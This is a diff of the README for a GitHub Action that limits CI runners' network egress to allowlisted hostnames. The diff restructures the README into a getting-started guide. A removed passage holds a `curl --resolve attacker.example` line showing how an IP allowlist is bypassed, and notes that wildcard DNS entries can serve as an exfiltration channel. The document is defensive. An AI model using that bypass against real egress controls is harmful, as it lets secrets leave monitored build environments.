@@ -2,200 +2,89 @@
 
 ![Safer Runner Action — hostname-based egress control for GitHub Actions runners](docs/assets/banner.svg)
 
-Lock a GitHub-hosted runner's network egress to the hostnames your job actually needs.
+Safer Runner limits the hosts that a GitHub Actions job can connect to.
 
-> **v2 — a rewrite, not an upgrade of v1.** Pin an exact version or SHA; there is no moving `@v2`
-> tag. v1 stays on `@v1`. Design: [docs/DESIGN-v2.md](docs/DESIGN-v2.md).
+A GitHub-hosted runner can reach the whole internet. If a dependency, an action or a build script
+is compromised, it can send your source code, tokens and secrets anywhere. Safer Runner blocks
+all outbound traffic except to GitHub's own hosts and the hostnames that you allow. It also
+removes `sudo` and `docker` access, so that a step cannot switch the controls off.
 
-## Problem
+The action checks the hostname, not the IP address. Allowed IP addresses often belong to shared
+CDNs and cloud ranges, so an IP allowlist also lets traffic through to an attacker's site on the
+same range. [How it works](docs/HOW-IT-WORKS.md) explains the design.
 
-A GitHub-hosted runner can reach the whole internet. One compromised dependency, action, or
-build script can send your source, tokens, or secrets anywhere — the recent wave of CI
-supply-chain attacks did exactly that.
+Safer Runner runs on GitHub-hosted Ubuntu 24.04 and 26.04 runners.
 
-Blocking by **IP address** does not close this. Allowed IPs belong to shared CDNs and cloud
-ranges, so `curl --resolve attacker.example:443:<allowed-ip>` reaches an attacker's site over a
-trusted IP, with a valid certificate.
+## Get started
 
-## Solution
+Start in `analyze` mode. Safer Runner records what the job does and suggests a configuration. Then
+change to `enforce` mode, which blocks everything that the configuration does not allow.
 
-Safer Runner filters egress by **hostname**. It forces all HTTP and HTTPS from the job through a
-TLS-terminating proxy (mitmproxy), checks the TLS SNI and each request's `Host` against your
-allowlist, and connects to the name itself — never to the IP the client picked. A default-deny
-DNS resolver (CoreDNS) and fail-closed iptables back it up. [How it works →](docs/DESIGN-v2.md)
+1. Add the action as the **first** step of the job:
 
-- **Two modes.** `analyze` watches and reports what the job contacts, blocking nothing.
-  `enforce` blocks anything off the allowlist, removes sudo and the docker group, and fails the
-  job on tampering.
-- **Hostname allowlist, exact by default.** Opt into subdomains explicitly.
-- **Optional `http-filter`.** Limit the methods and paths allowed on a host — make a registry
-  read-only, or allow git push only to your own repositories.
-  [Spec →](docs/DESIGN-L7-path-method.md)
-- **Containers too.** `services:`, `docker run`, compose, and `docker build` RUN steps get the
-  same policy, through the same proxy and DNS filter.
+   ```yaml
+   jobs:
+     build:
+       runs-on: ubuntu-latest
+       steps:
+         - uses: portswigger-tim/safer-runner-action@ebd9bc0bc39df7c9b044ee698cbec5efc201a248 # v2.3.0
+         - uses: actions/checkout@v5 # pin this by SHA too
+         - run: npm ci
+   ```
 
-## Usage
+   The action's `pre` step applies the controls before any other step runs, including the `pre`
+   steps of other actions. Pin the action to a commit SHA, as shown.
+   [Verifying this action](docs/VERIFYING.md) explains why, and how to check a release.
 
-Put it **first** in the job. Its `pre` step applies the policy before any other step runs,
-including other actions' `pre` steps.
+2. Run the workflow. `analyze` is the default mode, which does not block hosts.
 
-```yaml
-jobs:
-  build:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: portswigger-tim/safer-runner-action@v2.3.0 # pin an exact version or SHA — no moving @v2 tag
-        with:
-          mode: enforce
-          allowed-domains: |
-            registry.npmjs.org
-            pypi.org
-            files.pythonhosted.org
-            .docker.io        # docker.io and all of its subdomains
-      - uses: actions/checkout@v5
-      - run: npm ci
-```
+3. Open the job summary of the run. The **Summary** section shows what `enforce` would block. The
+   **Suggested Enforce Configuration** section contains a `uses:` block with the settings that
+   this job needs.
 
-Start in `mode: analyze` (the default). Nothing is blocked. The job summary opens with a scorecard
-of what enforce would block, then one **Suggested Enforce Configuration** block to paste: the
-`allowed-domains`, `sudo-config` and `docker` settings this job needs (an `http-filter` is offered
-as an option). Review it, switch to `enforce`, and the details below the summary show every host,
-sudo command and container the job used. GitHub's own endpoints (checkout, artifacts,
-cache, OIDC) are allowed automatically.
+4. Review the suggestion, and copy it into the workflow. It looks like this:
 
-### Inputs
+   ```yaml
+         - uses: portswigger-tim/safer-runner-action@ebd9bc0bc39df7c9b044ee698cbec5efc201a248 # v2.3.0
+           with:
+             mode: enforce
+             allowed-domains: |
+               registry.npmjs.org
+   ```
 
-| Input | Default | |
-|---|---|---|
-| `mode` | `analyze` | `analyze` (watch and report) or `enforce` (block) |
-| `allowed-domains` | | Hostnames the job may reach, one per line. See [allowlist syntax](#allowlist-syntax) |
-| `http-filter` | | Per host: path pattern → allowed methods. On a filtered host, everything not listed is refused. [Spec](docs/DESIGN-L7-path-method.md) |
-| `allow-github-platform` | `true` | When a GitHub host is filtered, allow the exact endpoints the runner and first-party actions need (logs, cache, artifacts, OIDC) |
-| `passthrough-domains` | `hosted-compute-*.githubapp.com` | Hosts checked by SNI only (not decrypted). Single-tenant hosts whose clients can't trust the CA. The default is always included |
-| `block-risky-github-subdomains` | `true` | Deny `gist.github.com`, `gist.githubusercontent.com`, `raw.githubusercontent.com` |
-| `dns-servers` | `9.9.9.9 149.112.112.112` | Upstream resolvers for allowlisted names (Quad9 by default) |
-| `disable-sudo` | `true` | Remove the runner's sudo after setup. `enforce` applies it; `analyze` never changes sudo, it reports what enforce would block. `false` keeps sudo, which makes enforce **ADVISORY** |
-| `sudo-config` | | With sudo removed, the exact sudo command lines the job may still run as root. [Below](#sudo-allowlist-sudo-config). Any entry makes enforce **ADVISORY** |
-| `docker` | `remove-group` | `keep`, `remove-group`, or `stop`. `enforce` applies it; `analyze` never changes docker. `keep` in enforce makes the job **ADVISORY** |
-| `fail-on-tampering` | follows `mode` | `enforce` fails the post step if the safer-runner config changed during the job |
+   You do not need to allow GitHub's own hosts (checkout, artifacts, cache and OIDC). The action
+   allows them automatically.
 
-An explicit value always wins; leaving `fail-on-tampering` unset follows the mode.
-`analyze` never changes sudo or docker on the runner. Keeping sudo or docker in enforce means a
-root step could remove the controls, so the job is labelled **ADVISORY** rather than enforced.
-See [docs/DESIGN-v2.md](docs/DESIGN-v2.md) for the full enforce behaviour.
+5. Run the workflow again. If the job fails because a host is blocked, the job summary shows the
+   host. [Troubleshooting](docs/TROUBLESHOOTING.md) tells you what to do.
 
-### Sudo allowlist (`sudo-config`)
+In `enforce` mode, the action also removes `sudo` and `docker` access from the job. If the job
+needs them, the suggestion includes `sudo-config` or `docker: keep`, and the job is
+[ADVISORY](docs/CONFIGURATION.md#privilege-sudo-and-docker).
 
-Prefer no sudo. If a job needs a few root commands, list the exact command lines:
+## Documentation
 
-```yaml
-- uses: portswigger-tim/safer-runner-action@<version>
-  with:
-    mode: enforce
-    sudo-config: |
-      - /usr/bin/apt-get update
-      - /usr/bin/apt-get install -y jq
-```
+### How-to guides
 
-Each line is an absolute path and its exact arguments (a command with no arguments allows none).
-A lone trailing `*` allows one or more further arguments, options included: avoid it. Only
-letters, digits and `_ . / @ + -`. In `analyze`, the summary lists the sudo commands enforce
-would block and suggests a `sudo-config` from the job's own use (exact lines only; anything that
-looks like a secret is left out). This is best effort: the sudo log does not show `sudo -E` or
-where one argument ends and the next begins, so check the job under `enforce`. Setup warns about
-entries that give root or sit under a path the job can write (`/home`, `/tmp`, the tool cache,
-the workspace).
+- [Troubleshooting](docs/TROUBLESHOOTING.md): find why a request was blocked, and fix it.
+- [Limit methods and paths on a host](docs/HTTP-FILTER.md): make a registry read-only, allow
+  `git push` only to your own repositories, or build a filter from the job's traffic.
+- [Verifying this action](docs/VERIFYING.md): pin the action by SHA and check its build
+  provenance.
 
-**A sudo allowlist is not a boundary.** A command that can run code or write files (`apt-get`,
-`bash`, `tee`, `systemctl`, ...) gives the job root, and root can remove the egress controls.
-Enforce with any `sudo-config` is labelled **ADVISORY**.
+### Reference
 
-### Docker (`docker`)
+- [Configuration](docs/CONFIGURATION.md): every input, the allowlist syntax, and the sudo and
+  docker options.
+- [`http-filter` rules](docs/HTTP-FILTER.md#rules): the path and method syntax, and the GitHub
+  platform endpoints.
+- [Limitations](docs/LIMITATIONS.md): what the action does not control.
+- [Release notes](docs/RELEASE-NOTES.md)
 
-Unset, `docker` is `remove-group`: enforce takes docker from the job (the runner user leaves the
-`docker` group and the socket becomes root-only); service containers keep running. `stop` also
-stops the daemon and its containers. `analyze` never changes docker: the summary lists the job's
-use of docker after setup (container runs, `docker exec`, pulls and builds, container actions)
-that enforce would block, and suggests a `docker` setting. A job that uses docker needs
-`docker: keep`, which makes enforce **ADVISORY** (docker is root-equivalent): move that work to a
-job that does not run under enforce where you can. This is best effort: read-only calls
-(`docker ps`, `logs`, `inspect`, `login`) leave no event and are not seen, and in analyze the job
-has docker, so it can stop the recording.
+### Explanation
 
-### Allowlist syntax
+- [How it works](docs/HOW-IT-WORKS.md): the threat model, the four layers of control, and the
+  job lifecycle.
+- [CI/CD good practice](docs/CICD-GOOD-PRACTICE.md): other controls to use with this action.
 
-The same patterns drive the proxy **and** DNS, so the two never disagree.
-
-| Entry | Allows | Example |
-|---|---|---|
-| `example.com` | **exactly** `example.com` — not `www.example.com` | `pypi.org` |
-| `*.example.com` | every subdomain, any depth — not `example.com` itself | `*.nip.io` |
-| `.example.com` | shorthand for `example.com` + `*.example.com` | `.docker.io` |
-| `pre*.example.com` | `*` within one label | `productionresultssa*.blob.core.windows.net` |
-
-A bare entry is that name only. Wildcard entries forward every lookup under the zone, so they
-double as a DNS channel to whoever runs that zone's name servers — prefer exact names, and use
-wildcards only for zones you trust.
-
-### Examples
-
-**Make registries read-only.** Reads use `GET`/`HEAD`; publishes use `PUT`/`POST`. One line per
-host blocks the write and keeps installs working:
-
-```yaml
-with:
-  mode: enforce
-  allowed-domains: |
-    registry.npmjs.org
-    ghcr.io
-  http-filter: |
-    registry.npmjs.org:
-      "*": GET, HEAD         # npm install: yes. npm publish: no
-    ghcr.io:
-      "*": GET, HEAD         # docker pull: yes. docker push: no
-```
-
-**Allow git push to your own repositories only.** A push path ends in `git-receive-pack`, a
-fetch in `git-upload-pack`; the most specific rule wins:
-
-```yaml
-with:
-  mode: enforce
-  allowed-domains: github.com
-  http-filter: |
-    github.com:
-      "*": "*"
-      "*/git-receive-pack": NONE                   # refuse all pushes...
-      "portswigger-tim/*/git-receive-pack": "*"    # ...except to this org
-```
-
-More patterns and the full rule set: [docs/DESIGN-L7-path-method.md](docs/DESIGN-L7-path-method.md).
-
-## Caveats
-
-Safer Runner hardens one layer — network egress. It is not a complete sandbox. The caveats that
-change how you use it:
-
-- **Keeping sudo or docker makes enforce advisory.** A root step can remove the proxy and
-  firewall, and docker group membership is root-equivalent. Enforce removes both; the summary
-  labels the job ADVISORY if you keep either.
-- **Allowed hosts are full-capability channels.** If `github.com` is allowed, a malicious step
-  can push data to a repository it controls. Narrow this with
-  [`http-filter`](docs/DESIGN-L7-path-method.md).
-- **The job summary and tamper check are advisory.** They run in the post step from files the
-  job can modify, and name redaction is best-effort, not a guarantee. Treat them as a tripwire,
-  not tamper-proof evidence — and don't upload the raw runner logs from a public repository.
-- **Names that resolve to internal addresses are refused** — including some Azure
-  private-networking runners that reach private services by name.
-- **Only TCP 80/443 is proxied.** Other ports, including SSH (`git@github.com`), are rejected in
-  enforce.
-- **GitHub-hosted Ubuntu runners only** (24.04 / 26.04).
-
-Full list → [docs/LIMITATIONS.md](docs/LIMITATIONS.md).
-
-## More
-
-- [Verifying this action (supply chain)](docs/VERIFYING.md) — pin by SHA, check build provenance.
-- [CI/CD good practice](docs/CICD-GOOD-PRACTICE.md) — defence in depth around this action.
-- [Design](docs/DESIGN-v2.md) · [`http-filter` spec](docs/DESIGN-L7-path-method.md) ·
-  [Release notes](docs/RELEASE-NOTES.md)
+To report a vulnerability, read the [security policy](SECURITY.md).
